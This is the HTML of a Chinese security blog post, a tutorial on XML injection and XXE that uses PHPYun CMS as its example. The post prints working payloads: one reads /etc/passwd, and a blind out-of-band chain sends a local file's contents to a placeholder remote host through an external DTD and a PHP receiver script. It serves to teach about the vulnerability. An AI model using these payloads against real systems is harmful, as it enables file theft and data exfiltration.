@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+    <meta name="keywords" content="YYK,Cyber Security,网络安全">
+    
+    <meta name="description" content="">
+    <meta name="description" content="首先，我们需要对XML进行一定的了解，在这里不做过多的多余叙述，接下图为XML工作流程： 简易xml概括实体引用对于实体ENTITY，XML定义了两种类型的实体，一种在XML文档中使用，另一种作为参数在DTD中使用。语法如下： 1&lt;!DOCTYPE 名字 [&lt;!ENTITY 实体名 &quot;实体内容&quot;]&gt; 楼下为预定义的实体引用 DTD(文档类型定义)定义：其可定义XML文档的合法构建">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xml注入">
+<meta property="og:url" content="http://yoursite.com/2020/03/14/xml%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="首先，我们需要对XML进行一定的了解，在这里不做过多的多余叙述，接下图为XML工作流程： 简易xml概括实体引用对于实体ENTITY，XML定义了两种类型的实体，一种在XML文档中使用，另一种作为参数在DTD中使用。语法如下： 1&lt;!DOCTYPE 名字 [&lt;!ENTITY 实体名 &quot;实体内容&quot;]&gt; 楼下为预定义的实体引用 DTD(文档类型定义)定义：其可定义XML文档的合法构建">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200210154120319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200210154419572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200210155742589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200209214349905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200210174428719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200210162334155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-03-14T12:26:50.629Z">
+<meta property="article:modified_time" content="2020-03-14T12:53:44.769Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="web漏洞总结">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200210154120319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>xml注入 · YYK&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/logo_favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >YYK&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">xml注入</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>YYK's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            xml注入
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web漏洞总结">web漏洞总结</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.6k</span>Reading time: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/14</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>首先，我们需要对<a href="https://www.runoob.com/xml/xml-tutorial.html" target="_blank" rel="noopener">XML</a>进行一定的了解，在这里不做过多的多余叙述，接下图为XML工作流程：<br><img src="https://img-blog.csdnimg.cn/20200210154120319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="简易xml概括"><a href="#简易xml概括" class="headerlink" title="简易xml概括"></a>简易xml概括</h1><h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><p>对于实体ENTITY，XML定义了两种类型的实体，一种在XML文档中使用，另一种作为参数在DTD中使用。语法如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 名字 [&lt;!ENTITY 实体名 <span class="string">"实体内容"</span>]&gt;</span><br></pre></td></tr></table></figure>
+<p>楼下为预定义的实体引用<br><img src="https://img-blog.csdnimg.cn/20200210154419572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>其可定义XML文档的合法构建模块，可在XML文档内声明，也可外部引用。</p>
+<h3 id="构建方式："><a href="#构建方式：" class="headerlink" title="构建方式："></a>构建方式：</h3><p>先来说下CDATA，指由XML解析器进行解析的文本数据（未分析的字符数据）。在XML中，＜，＆字符为非法，避免麻烦例如JS代码，就将脚本代码定为CDATA ，其中的内容都会被解析器忽略，组成结构为：<code>&quot; &lt;![CDATA [&quot; ****&quot;]]&gt;&quot;</code>。其次就是普通声明及引用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name <span class="string">"entity-value"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>引用：<br><code>&lt;message&gt;＆entity-name; &lt;/ message&gt;</code>，即可将“ entity-value”展示出来</p>
+<h4 id="1-内部实体声明"><a href="#1-内部实体声明" class="headerlink" title="1.内部实体声明"></a>1.内部实体声明</h4><p>内部实体指在一个实体中定义的另一个实体,可用单双引号来区分内外部。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg:&lt;!ENTITY % in <span class="string">"&lt;!ENTITY web 'http://vps'&gt;"</span>&gt;  </span><br><span class="line">%in;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-外部实体声明及默认协议"><a href="#2-外部实体声明及默认协议" class="headerlink" title="2.外部实体声明及默认协议"></a>2.外部实体声明及默认协议</h4><p><img src="https://img-blog.csdnimg.cn/20200210155742589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg: <span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">	&lt;!DOCTYPE xxe [</span><br><span class="line">		&lt;!ENTITY flag SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">	&lt;a&gt;&amp;flag;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="3-参数实体"><a href="#3-参数实体" class="headerlink" title="3.参数实体"></a>3.参数实体</h4><p>参数实体仅用于DTD和文档的内部子集中，XML的规范定义中，仅在DTD中才能引用参数实体。并且参数实体的引用在DTD中是该类型的实体使用“百分比”字符（或十六进制）编码的百分比）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容，其在DTD中的解析优先于XML文本中的内部实体解析。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg: <span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">	&lt;!DOCTYPE a[</span><br><span class="line">		&lt;!ENTITY % one <span class="string">"hello"</span>&gt;</span><br><span class="line">	]&gt;</span><br><span class="line">	%one;</span><br></pre></td></tr></table></figure>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="原理-以PHPYun-cms为例"><a href="#原理-以PHPYun-cms为例" class="headerlink" title="原理(以PHPYun cms为例)"></a>原理(以PHPYun cms为例)</h3><p>这里的漏洞位置为此cms的<code>weixin/model/index.class.php</code>,如下所示:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">responseMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">    $postStr = $GLOBALS[<span class="string">"HTTP_RAW_POST_DATA"</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($postStr))&#123;</span><br><span class="line"></span><br><span class="line">                 $postObj = simplexml_load_string($postStr, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOCDATA);</span><br><span class="line">                  $fromUsername = $postObj-&gt;FromUserName;</span><br><span class="line">                  $toUsername = $postObj-&gt;ToUserName;</span><br><span class="line">                  $keyword = trim($postObj-&gt;Content);</span><br><span class="line">                  $time = time();</span><br><span class="line">                  $textTpl = <span class="string">"&lt;xml&gt;</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         %s</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         0</span></span><br><span class="line"><span class="string">         &lt;/xml&gt;"</span>;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="keyword">empty</span>( $keyword ))</span><br><span class="line">                  &#123;</span><br><span class="line">                  $msgType = <span class="string">"text"</span>;</span><br><span class="line">                   $contentStr = <span class="string">"Welcome to wechat world!"</span>;</span><br><span class="line">                   $resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);</span><br><span class="line">                   <span class="keyword">echo</span> $resultStr;</span><br><span class="line">                  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">"Input something..."</span>;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">          &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">           <span class="keyword">exit</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以看到<code>$postStr = $GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;]</code>,这句话的意思是传递原生的语句,而后<code>$postObj = simplexml_load_string($postStr, &#39;SimpleXMLElement&#39;, LIBXML_NOCDATA);</code>又通过simplexml_load_string函数解析后,直接传入<code>$textTpl</code>.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);</span><br></pre></td></tr></table></figure>
+<p>这里也相当于直接获取post过来的XML内容直接输出.(请记住这一部分,我们将会在下一部分XXE与SQL注入继续审计)</p>
+<h3 id="外部实体注入"><a href="#外部实体注入" class="headerlink" title="外部实体注入"></a>外部实体注入</h3><p><img src="https://img-blog.csdnimg.cn/20200209214349905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="https://m.hundan.org/wooyun-2015-0148793"></p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="基于盲注的XXE"><a href="#基于盲注的XXE" class="headerlink" title="基于盲注的XXE"></a>基于盲注的XXE</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当我们在无回显和无报错的基础上使用盲注，即来构建一条带外信道（OOB）获得数据，主要使用DTD中的内部实体及参数实体。</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>注入xml文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % host SYSTEM <span class="string">"file:///D:/flag.txt"</span>&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM <span class="string">"http://xxx/xxx.xml"</span>&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %receive;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p>xxx.xml文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % receive <span class="string">"&lt;!ENTITY send SYSTEM 'http://xxx/x.php?host=%host;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>x.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">file_put_contents(<span class="string">"1.txt"</span>, $_GET[<span class="string">'host'</span>]) ;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过以上代码就可以进行读取文件等常规操作了，以上说的是php环境，再说下java环境：可通过gopher，file和jar等协议进行配合nc，ftp协议，<br>这里找到<a href="https://hawkinsecurity.com/2018/03/24/gaining-filesystem-access-via-blind-oob-xxe/" target="_blank" rel="noopener">一个赏金猎人写的文章</a>，可以一看</p>
+<h4 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p>其实只要让网站对我们的服务器发一个http请求，然后看是否服务器接收到请求即可。代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://vps"</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于报错的XXE"><a href="#基于报错的XXE" class="headerlink" title="基于报错的XXE"></a>基于报错的XXE</h3><p>和sql注入中的报错注入差不多的原理，当我们将payload故意写错，例如在第二行出错，那xml的内容就会出现在下一行。<br>下图为示例<br><img src="https://img-blog.csdnimg.cn/20200210174428719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="XML配置文件未授权访问"><a href="#XML配置文件未授权访问" class="headerlink" title="XML配置文件未授权访问"></a>XML配置文件未授权访问</h3><p>多见于用户名,密码,apache,ldap数据库等配置信息泄露<br>更多示例可查看以下链接:<br><a href="https://m.hundan.org/wooyun-2015-0123762" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2015-0123762</a>;<br><a href="https://m.hundan.org/wooyun-2015-0123588" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2015-0123588</a>;<br><a href="https://m.hundan.org/wooyun-2016-0207791(19护网顺手挖到了一个同款漏洞呵呵)" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2016-0207791(19护网顺手挖到了一个同款漏洞呵呵)</a></p>
